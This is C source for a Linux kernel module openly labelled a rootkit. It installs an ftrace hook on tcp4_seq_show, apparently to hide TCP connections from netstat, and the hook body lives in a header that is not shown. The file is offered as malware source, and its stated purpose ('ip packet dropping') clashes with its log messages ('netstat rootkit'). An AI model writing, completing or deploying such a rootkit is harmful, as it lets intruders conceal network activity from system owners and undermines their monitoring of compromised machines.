#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/dirent.h>
#include <linux/tcp.h>
#include "ftrace_helper2.h"


MODULE_LICENSE("GPL");
MODULE_AUTHOR("ROYCO");
MODULE_DESCRIPTION("a kernel module ip packet dropping rootkit");
MODULE_VERSION("1");



static struct ftrace_hook hooks[] = {
 	HOOK("tcp4_seq_show", new_tcp4_seq_show, &old_tcp4_seq_show),
 };


static int __init rootkit_enter(void) {

	int err;

	printk(KERN_INFO "netstat rootkit: is operating\n");
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err)
		return err;


	return 0;
}

static void __exit rootkit_exit(void) {


	//remove ftrace hooks
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "netstat rootkit: stopped\n");
}









module_init(rootkit_enter);
module_exit(rootkit_exit);

